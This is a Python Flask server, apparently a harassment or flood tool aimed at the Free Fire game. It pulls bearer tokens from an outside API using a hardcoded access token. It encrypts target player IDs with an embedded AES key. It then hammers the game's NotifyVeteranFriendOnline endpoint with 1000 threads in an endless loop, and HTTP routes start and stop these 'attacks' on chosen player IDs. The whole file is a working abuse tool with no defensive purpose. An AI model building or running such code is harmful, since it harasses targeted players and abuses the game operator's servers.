from flask import Flask, request, jsonify
import requests
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
import threading
from concurrent.futures import ThreadPoolExecutor
import time
import json
import os
import urllib3

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

app = Flask(__name__)

# Files
TOKEN_FILE = "tokens.json"
TARGETS_FILE = "targets.json"
ACTIVE_ATTACKS_FILE = "active_attacks.json"

# Token API configuration
ACCESS_TOKEN = "e5bdbee2bd23818f66e3d30209217bc994237123818f6426a9ef4ed8a3358ef5"
TOKEN_API_URL = f"https://tmk-acc.vercel.app/api/{ACCESS_TOKEN}"
LAST_TOKEN_UPDATE = 0
TOKEN_UPDATE_INTERVAL = 8 * 60 * 60  # 8 hours in seconds

# Load data from files
def load_tokens():
    if os.path.exists(TOKEN_FILE):
        with open(TOKEN_FILE, 'r') as f:
            try:
                data = json.load(f)
                return data if isinstance(data, dict) else {}
            except json.JSONDecodeError:
                return {}
    return {}

def save_tokens(tokens):
    with open(TOKEN_FILE, 'w') as f:
        json.dump(tokens, f)

def load_targets():
    if os.path.exists(TARGETS_FILE):
        with open(TARGETS_FILE, 'r') as f:
            try:
                return json.load(f)
            except json.JSONDecodeError:
                return {}
    return {}

def save_targets(targets):
    with open(TARGETS_FILE, 'w') as f:
        json.dump(targets, f)

def load_active_attacks():
    if os.path.exists(ACTIVE_ATTACKS_FILE):
        with open(ACTIVE_ATTACKS_FILE, 'r') as f:
            try:
                return json.load(f)
            except json.JSONDecodeError:
                return {}
    return {}

def save_active_attacks(active_attacks):
    with open(ACTIVE_ATTACKS_FILE, 'w') as f:
        json.dump(active_attacks, f)

# Initialize data
tokens = load_tokens()
targets = load_targets()
active_attacks = load_active_attacks()

# Global variables
token = tokens.get('current_token', '')
stop_attacks = False
attack_threads = {}

# Function to get token from API
def get_token_from_api():
    global LAST_TOKEN_UPDATE, token
    try:
        response = requests.get(TOKEN_API_URL, timeout=10, verify=False)
        if response.status_code == 200:
            new_token = response.json().get("token", "")
            if new_token:
                token = new_token
                tokens['current_token'] = new_token
                save_tokens(tokens)
                LAST_TOKEN_UPDATE = time.time()
                return True
        return False
    except Exception as e:
        return False

# Check and update token if needed
def check_and_update_token():
    global LAST_TOKEN_UPDATE, token
    current_time = time.time()
    
    if not token or (current_time - LAST_TOKEN_UPDATE) >= TOKEN_UPDATE_INTERVAL:
        return get_token_from_api()
    return True

def Encrypt_ID(number):
    number = int(number)
    encoded_bytes = []
    while True:
        byte = number & 0x7F
        number >>= 7
        if number:
            byte |= 0x80
        encoded_bytes.append(byte)
        if not number:
            break
    return bytes(encoded_bytes).hex()

def encrypt_api(plain_text):
    plain_text = bytes.fromhex(plain_text)
    key = bytes([89, 103, 38, 116, 99, 37, 68, 69, 117, 104, 54, 37, 90, 99, 94, 56])
    iv = bytes([54, 111, 121, 90, 68, 114, 50, 50, 69, 51, 121, 99, 104, 106, 77, 37])
    cipher = AES.new(key, AES.MODE_CBC, iv)
    cipher_text = cipher.encrypt(pad(plain_text, AES.block_size))
    return cipher_text.hex()

def send_request(target_id):
    global token, stop_attacks
    if stop_attacks or target_id not in targets:
        return False
        
    url = "https://clientbp.ggwhitehawk.com/NotifyVeteranFriendOnline"
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "X-GA": "v1 1",
        "ReleaseVersion": "OB50",
        "Host": "clientbp.ggwhitehawk.com",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
        "User-Agent": "Free%20Fire/2019117061 CFNetwork/1399 Darwin/22.1.0",
        "Connection": "keep-alive",
        "Authorization": f"Bearer {token}",
        "X-Unity-Version": "2018.4.11f1",
        "Accept": "/"
    }
    
    iddd = "0a" + Encrypt_ID(len(target_id) // 2) + Encrypt_ID(target_id)
    data = bytes.fromhex(encrypt_api(iddd))
    
    try:
        response = requests.post(url, headers=headers, data=data, verify=False, timeout=10)
        return response.status_code == 200
    except:
        return False

def continuous_attack(target_id):
    global stop_attacks
    requests_sent = 0
    successful_requests = 0
    
    # Add to active attacks
    active_attacks[target_id] = {
        'start_time': time.time()
    }
    save_active_attacks(active_attacks)
    
    while target_id in targets and not stop_attacks:
        with ThreadPoolExecutor(max_workers=1000) as executor:
            futures = []
            for _ in range(1500):
                if stop_attacks or target_id not in targets:
                    break
                futures.append(executor.submit(send_request, target_id))
                requests_sent += 1
            
            # Count successful requests
            for future in futures:
                if future.result():
                    successful_requests += 1
    
    # Remove from active attacks
    if target_id in active_attacks:
        del active_attacks[target_id]
        save_active_attacks(active_attacks)
    
    return requests_sent, successful_requests

# API Routes - ALL GET
@app.route('/')
def home():
    return jsonify({
        "status": "online",
        "message": "Xm9BrA PRo API is running",
        "targets_count": len(targets),
        "active_attacks": len(active_attacks)
    })

@app.route('/add/<target_id>')
def add_target(target_id):
    global targets
    
    # Check and update token
    if not check_and_update_token():
        return jsonify({"error": "Failed to get valid token from API"}), 500
    
    # Validate target ID (must be numeric)
    if not target_id.isdigit():
        return jsonify({"error": "Target ID must contain only numbers"}), 400
    
    # Add to targets
    targets[target_id] = {
        'added_time': time.time(),
        'added_by': 'api'
    }
    save_targets(targets)
    
    # Start attack in background
    def run_attack():
        continuous_attack(target_id)
    
    thread = threading.Thread(target=run_attack)
    thread.daemon = True
    attack_threads[target_id] = thread
    thread.start()
    
    return jsonify({
        "success": True,
        "message": f"Attack started on target: {target_id}",
        "target_id": target_id
    })

@app.route('/remove/<target_id>')
def remove_target(target_id):
    global targets
    
    if target_id in targets:
        del targets[target_id]
        save_targets(targets)
        return jsonify({
            "success": True,
            "message": f"Target {target_id} removed successfully"
        })
    else:
        return jsonify({
            "error": f"Target {target_id} not found"
        }), 404

@app.route('/list')
def list_targets():
    return jsonify({
        "targets": list(targets.keys()),
        "count": len(targets)
    })

@app.route('/active')
def active_attacks_list():
    active_list = []
    for target_id, info in active_attacks.items():
        elapsed_time = int(time.time() - info['start_time'])
        active_list.append({
            "target_id": target_id,
            "elapsed_time_seconds": elapsed_time
        })
    
    return jsonify({
        "active_attacks": active_list,
        "count": len(active_list)
    })

@app.route('/stop')
def stop_all_attacks():
    global stop_attacks, targets, active_attacks
    
    stop_attacks = True
    targets.clear()
    save_targets(targets)
    active_attacks.clear()
    save_active_attacks(active_attacks)
    
    # Reset stop flag after a short delay
    def reset_stop():
        time.sleep(2)
        global stop_attacks
        stop_attacks = False
    
    threading.Thread(target=reset_stop).start()
    
    return jsonify({
        "success": True,
        "message": "All attacks stopped successfully"
    })

@app.route('/token/update')
def update_token():
    if get_token_from_api():
        return jsonify({
            "success": True,
            "message": "Token updated successfully",
            "token_preview": token[:20] + "..."
        })
    else:
        return jsonify({
            "error": "Failed to update token"
        }), 500

@app.route('/token/info')
def token_info():
    return jsonify({
        "token_preview": token[:20] + "..." if token else "None",
        "last_update": time.ctime(LAST_TOKEN_UPDATE),
        "next_update_in_seconds": int(TOKEN_UPDATE_INTERVAL - (time.time() - LAST_TOKEN_UPDATE))
    })

# Initialize token on startup
def initialize_token():
    global LAST_TOKEN_UPDATE, token
    if get_token_from_api():
        pass

if __name__ == "__main__":
    # Initialize token on startup
    initialize_token()
    
    # Start background token update checker
    def token_updater():
        while True:
            time.sleep(3600)  # Check every hour
            check_and_update_token()
    
    updater_thread = threading.Thread(target=token_updater)
    updater_thread.daemon = True
    updater_thread.start()
    
    app.run(host='0.0.0.0', port=5000, debug=False)
